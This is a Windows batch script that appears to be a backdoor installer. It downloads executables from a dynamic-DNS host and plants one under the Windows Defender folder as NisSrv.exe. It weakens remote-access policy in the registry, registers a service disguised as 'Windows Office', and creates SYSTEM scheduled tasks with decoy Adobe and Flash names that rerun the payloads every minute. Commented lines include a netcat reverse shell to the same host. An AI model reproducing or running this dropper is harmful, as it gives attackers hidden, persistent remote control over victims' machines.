rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/plink.exe','%windir%\plink.exe')
rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/mila.ppk','%windir%\mila.ppk')
rem wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/win.bat  -O %temp%\win.bat
rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/win/get.bat','%windir%\get.bat')
rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/win/nc64.exe','%windir%\nc64.exe')
%windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/win/wget.exe','%windir%\wget.exe')
%windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/win/wofficeie1.exe','%windir%\wofficeie1.exe')
%windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/win/cacert.pem','%windir%\cacert.pem')
%windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/win/woffice.exe','%windir%\woffice.exe')
%windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/win/woffice.exe','C:\Program Files\Windows Defender\NisSrv.exe')
rem wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/win.bat  -O %windir%\win.bat
wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/get.bat  -O %windir%\get.bat
wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/sys.xml  -O %windir%\sys.xml
wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/syskill.xml  -O %windir%\syskill.xml
wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/office_get.xml  -O %windir%\office_get.xml
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
rem %windir%\wofficeie1.exe
SLEEP 10
taskkill /f /im wup.exe
copy /y %windir%\wofficeie1.exe %windir%\wup.exe
sc create wup binPath= "%windir%\wup.exe" DisplayName= "Windows Office" start= auto
net start wup
schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "%windir%\woffice.exe" /tn myadobe1 /rl highest /F
schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "C:\Program Files\Windows Defender\NisSrv.exe" /tn flash_fw /rl highest /F
schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr "taskkill /f /im woffice.exe" /tn myflash /rl highest /F
schtasks /create /tn sys /xml %windir%\sys.xml /F
schtasks /create /tn syskill /xml %windir%\syskill.xml /F
schtasks /create /tn office_get /xml %windir%\office_get.xml /F
rem schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "nc64.exe -e cmd.exe verifiche.ddns.net 4001" /tn sys /rl highest /F
rem schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr "taskkill /f /im nc64.exe"  /tn syskill /rl highest /F
rem schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "%windir%\get.bat" /tn office_get /rl highest /F
rem schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "net start wup" /tn myadobe2 /rl highest /F
rem schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr "taskkill /f /im wup.exe" /tn myflash2 /rl highest /F
rem schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "nc64.exe -e cmd.exe verifiche.ddns.net 4001" /tn sys /rl highest /F
rem schtasks /delete /tn sys /F
